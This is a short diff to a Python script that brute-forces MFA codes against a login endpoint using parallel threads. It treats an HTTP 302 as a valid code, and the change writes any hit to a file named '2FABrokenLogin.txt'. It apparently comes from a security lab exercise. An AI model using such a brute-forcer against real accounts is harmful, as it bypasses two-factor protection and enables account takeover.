@@ -35,7 +35,10 @@ def testing_mfa(mfa_code):
         allow_redirects=False,
     )
     if response.status_code == 302:
-        print(f'\033[92mValid mfa code: {mfa_code} code: {response.status_code}\033[0m')
+        phrase = f'Valid mfa code: {mfa_code} code: {response.status_code}'
+        print(f'\033[92m{phrase}\033[0m')
+        with open('2FABrokenLogin.txt', 'w') as f:
+            f.write(phrase)
     print(f'Invalid mfa code: {mfa_code} code: {response.status_code}')
 
 with ThreadPoolExecutor(max_workers=10) as executor:
